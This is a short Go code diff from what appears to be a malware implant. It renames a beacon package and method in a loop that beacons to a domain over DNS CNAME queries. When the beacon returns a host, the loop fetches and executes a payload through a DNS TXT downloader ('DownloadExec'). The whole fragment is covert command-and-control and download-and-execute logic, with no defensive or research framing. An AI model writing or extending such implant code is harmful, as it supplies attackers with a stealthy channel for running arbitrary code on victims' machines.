@@ -17,12 +17,12 @@ const sleep = 1   // In seconds
 func main() {
 	sysid := "uuid"
 	checkIn := time.Now()
-	beacon := beacon.NewDnsCnameBeacon(sysid, domain)
+	beacon := beaconer.NewDnsCnameBeacon(sysid, domain)
 	downloader := downloader.NewDnsTxtDownloader()
 
 	for {
 		if checkIn.Before(time.Now()) {
-			host := beacon.Ping()
+			host := beacon.Beacon()
 
 			if host != "" {
 				downloader.DownloadExec(host)
